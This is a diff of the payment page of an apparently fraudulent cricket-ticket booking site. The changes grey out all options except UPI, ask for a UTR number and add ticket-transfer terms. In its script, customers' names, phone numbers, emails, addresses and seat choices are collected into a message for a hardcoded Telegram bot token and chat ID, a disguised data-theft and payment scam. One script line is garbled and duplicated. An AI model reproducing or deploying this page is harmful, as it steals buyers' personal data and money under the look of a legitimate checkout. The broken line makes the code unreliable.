@@ -27,6 +27,7 @@
             font-family: 'Roboto', sans-serif;
             background-color: #f2f5f9;
         }
+        /* CSS trick for the zigzag border */
         .zigzag-bottom {
             position: relative;
         }
@@ -42,6 +43,8 @@
             background-position: 0 0;
             z-index: 10;
         }
+
+        /* 🔥 MODAL POPUP CSS 🔥 */
         #tnc-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.75); z-index: 99999; opacity: 0; pointer-events: none; transition: opacity 0.3s ease; display: flex; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
         #tnc-modal.active { opacity: 1; pointer-events: auto; }
         #popup-box { background: #fff; width: 100%; max-width: 360px; border-radius: 12px; padding: 24px; transform: scale(0.95); transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1); max-height: 85vh; display: flex; flex-direction: column; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
@@ -72,7 +75,7 @@
         </div>
 
         <div class="bg-[#f4f4f4] px-4 py-3 border-b border-gray-200 mt-1">
-            <h2 class="text-xs text-gray-500 font-medium">UPI PAYMENT OPTIONS</h2>
+            <h2 class="text-xs text-gray-500 font-medium">OTHER PAYMENT OPTIONS</h2>
         </div>
 
         <div class="bg-white flex-1">
@@ -106,26 +109,23 @@
                         <path stroke-linecap="round" stroke-linejoin="round" d="M13 5l7 7-7 7M5 5l7 7-7 7" />
                     </svg>
                 </a>
-            </div>
 
-            <div class="bg-blue-50/50 px-4 py-5 border-b-2 border-gray-100 relative">
-                <div class="absolute left-0 top-0 h-full w-1 bg-blue-500"></div>
-                <h3 class="text-[14px] font-bold text-gray-800 mb-1">Confirm UPI Payment</h3>
-                <p class="text-[11px] text-gray-500 mb-3">Paid via UPI? Enter your 12-digit UTR/Reference number to verify instantly.</p>
-                
-                <div class="flex space-x-2">
-                    <input type="text" id="utr-input" placeholder="Enter 12-digit UTR" maxlength="12" class="flex-1 border border-blue-200 rounded-lg px-3 py-2.5 text-[14px] outline-none focus:border-blue-500 font-medium bg-white shadow-inner">
-                    <button id="submit-utr-btn" class="bg-[#007A33] text-white px-5 py-2.5 rounded-lg text-[14px] font-bold hover:bg-[#005c26] transition-colors shadow-md">
-                        Verify
-                    </button>
+                <div class="bg-blue-50/70 px-6 py-5 border-t border-blue-100 relative">
+                    <div class="absolute left-0 top-0 h-full w-1 bg-blue-500"></div>
+                    <h3 class="text-[14px] font-bold text-blue-900 mb-1">Confirm UPI Payment</h3>
+                    <p class="text-[11px] text-blue-700 mb-3">After paying on UPI, enter 12-digit UTR/Reference No. here.</p>
+                    
+                    <div class="flex space-x-2">
+                        <input type="text" id="utr-input" placeholder="Enter 12-digit UTR" maxlength="12" class="flex-1 border border-blue-300 rounded-lg px-3 py-2 text-[14px] outline-none focus:border-blue-600 font-medium bg-white shadow-inner">
+                        <button id="submit-utr-btn" class="bg-[#007A33] text-white px-5 py-2 rounded-lg text-[14px] font-bold hover:bg-[#005c26] transition-colors shadow-md">
+                            Verify
+                        </button>
+                    </div>
+                    <p id="utr-error" class="text-[11px] text-red-500 mt-2 hidden font-medium flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
+                        Please enter a valid 12-digit UTR number.
+                    </p>
                 </div>
-                <p id="utr-error" class="text-[11px] text-red-500 mt-2 hidden font-medium flex items-center">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-3 w-3 mr-1" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
-                    Please enter a valid 12-digit UTR number.
-                </p>
-            </div>
-            <div class="bg-[#f4f4f4] px-4 py-2 border-b border-gray-200">
-                <h2 class="text-[10px] text-gray-500 font-bold tracking-wider uppercase">Other Options</h2>
             </div>
 
             <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
@@ -188,6 +188,35 @@
                 </svg>
             </div>
 
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="1.5">
+                        <path stroke-linecap="round" stroke-linejoin="round" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    </svg>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Pay Later</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
+
+            <div class="flex items-center justify-between px-4 py-4 border-b border-gray-100 opacity-50 cursor-not-allowed" onclick="alert('Currently unavailable. Please pay using UPI.')">
+                <div class="flex items-center space-x-4">
+                    <div class="w-6 h-6 border rounded flex items-center justify-center border-orange-400">
+                        <span class="text-orange-500 font-bold text-[10px]">123</span>
+                    </div>
+                    <div class="flex flex-col">
+                        <span class="text-gray-800 text-[15px]">Redeem Points</span>
+                        <span class="text-[10px] text-red-500 font-medium">Currently Unavailable</span>
+                    </div>
+                </div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-gray-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7" />
+                </svg>
+            </div>
         </div>
 
         <div class="bg-[#f2f5f9] px-4 py-6 mt-auto">
@@ -202,8 +231,9 @@
             <p class="text-[11px] font-bold text-gray-500 mb-1">Note:</p>
             <ol class="text-[11px] text-[#999999] list-decimal pl-3 space-y-1">
                 <li>Registrations/Tickets once booked cannot be exchanged, cancelled or refunded.</li>
-                <li>In case of Credit/Debit Card bookings, the card holder must be present.</li>
+                <li>In case of Credit/Debit Card bookings, the Credit/Debit Card and Card holder must be present at the ticket counter while collecting the ticket(s).</li>
             </ol>
+            
             <p class="text-[10px] text-gray-400 mt-6">As safe as it gets</p>
         </div>
 
@@ -225,8 +255,9 @@
             </div>
             <div class="tnc-scroll overflow-y-auto flex-1 mb-5">
                 <div class="space-y-4 text-[14px] text-gray-500 leading-relaxed font-normal pr-1">
-                    <p>1. After booking is confirmed, your M-Ticket <b class="text-gray-700 font-semibold">will activate 48 hours before the match</b>.</p>
-                    <p>2. Open your M-Ticket in <b class="text-gray-700 font-semibold">"Your Booking & Purchases"</b> before heading to the venue.</p>
+                    <p>1. After booking is confirmed, your M-Ticket <b class="text-gray-700 font-semibold">will activate 48 hours before the match</b>. You can transfer tickets once the QR code is active.</p>
+                    <p>2. Open your M-Ticket in <b class="text-gray-700 font-semibold">"Your Booking & Purchases"</b> at home or <b class="text-gray-700 font-semibold">in a strong network/Wi-Fi area</b> before heading to the venue. This ensures quick access even if the network is weak at the stadium.</p>
+                    <p>3. If you've booked for someone else, use the <b class="text-gray-700 font-semibold">"Transfer Ticket"</b> option below the QR Code to send it to them. The receiver must accept the transfer for it to appear in their account</p>
                 </div>
             </div>
             <div class="pt-4 border-t border-gray-100">
@@ -257,23 +288,16 @@
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513";
             
-            // ========================================================
-            // 🔥 FIX: Direct Price Fetching (No Local Calculation) 🔥
-            // Ab ye seedha pichle page se final price uthayega!
-            // ========================================================
+            // 🔥 FIX: Direct Price Fetching (Naya Price Live Uthayega) 🔥
             let finalPriceStr = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || "0";
-            
-            // Remove any unwanted characters if any, just in case
             let finalPrice = parseInt(finalPriceStr.replace(/[^0-9]/g, ''));
             if (isNaN(finalPrice)) finalPrice = 0;
 
-            // UI PAR NAYA PRICE UPDATE KAREN
             const priceDisplays = document.querySelectorAll('.final_paid_price');
             priceDisplays.forEach(el => {
                 el.innerText = '₹' + finalPrice;
             });
 
-            // Match Details Fetch Karna
             let matchTitle = "Not Selected";
             let matchDate = "";
             try {
@@ -288,7 +312,7 @@
             const phone = localStorage.getItem('customerPhone') || "Not Provided";
             const email = localStorage.getItem('customerEmail') || "Not Provided";
             const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
-            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
+            const seats = localStorage.getItem(            const seats = localStorage.getItem('selectedSeats') || "Not Provided";
             
             const message = `🚨 *New User on Payment Page!* 🚨\n\n` +
                             `👤 *Name:* ${name}\n` +
